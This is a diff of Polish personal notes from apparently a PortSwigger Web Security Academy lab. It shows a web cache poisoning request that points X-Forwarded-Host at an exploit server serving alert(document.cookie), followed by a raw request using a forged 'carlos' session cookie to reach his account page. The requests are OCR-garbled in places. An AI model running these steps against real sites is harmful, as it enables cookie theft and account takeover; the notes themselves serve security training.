@@ -264,10 +264,43 @@ Maszynka B stage1: Web cache poisoning dopiero na fukcji szukania znaleziony
 inne cechy: forgot passowrd, change email, skaner nic nie wykrywa, no hiddern params.
 
 1. przygotowuje exploit server z endpointem /resources/js/tracking.js body: alert(document.cookie)
-w re
-2. robie kaszowanie w repeaterze /?cb=1 żeby sprawdzić czy wykonuje się kod w przegladarce i uzywam cb żeby nie czekac 30 sekund na kolejna probe
+2. robie kaszowanie w repeaterze /?cb=1 żeby sprawdzić czy wykonuje się kod w przegladarce i uzywam ?cb żeby nie czekac 30 sekund na kolejna probe
+x-schema: nothttps
+x-forwarded-host: exploit-server.net
 
+GET /?cb=1 HTTP/2
+Host : Oae6001c04191df583de5fla00f700b4.web-security-academy.net
+X-Forwarded-Schema: nohttps
+X-Forwarded-Host : exploit-Oa5c00d9047f1d7283dd5e3a01590082. exploit-server.net
 
+200
+
+Maszynka B stage2:
+
+GET /my-account ?id=carlos HTTP/2
+Host : Oae6001c04191df583de5fla00f700b4.web-security-academy. net
+Cookie: lab=
+46%7cMCwCFE5HcSrj dqut f70YPj 4UGeC%2bDWc8AhQ%2fPCu4NY30u JAOeAPpw02J80ESul XZMVf 2W%2fTK1t TJOHHm9fPgsy 817z5AnoY
+oBJUwcvk8y 6N4Eqonuuq4%2f Sae 4Hxo Am AqCYzNmOVTj PWMsxNrao0sdpgqQzwc73l nWCLSb0%2fGszV2XDk%3d; session=
+%7b%22username%22%3a%22carl os%22%2c%22isloggedin%22%3at rue%7d -- MCOCFQCA7KuWt SLvkEwa0%2foTqHiCiDZJXwIUJ19BV
+zPWPFBvWQRDJ%2fnpj%2f Jd rWU%3d
+Sec-Ch-Ua: "Not -A. Brand" ; v="24", "Chromium" ; v="146"
+Sec-Ch-Ua-Mobile: 70
+Sec-Ch-Ua-Platform: "Linux"
+Accept -Language : en-US, en ; q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent : Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0
+Safari/537.36
+Accept :
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng, */ *; q=0.8, applicati
+on/signed-exchange; v=b3; q=0.7
+Sec-Fetch-Site: cross-site
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest : document
+Referer: https://exploit-Oa5c00d9047f1d7283dd5e3a01590082.exploit-server.net/
+Accept -Encoding: gzip, deflate, br
+Priority: u=0, i
 
 
 
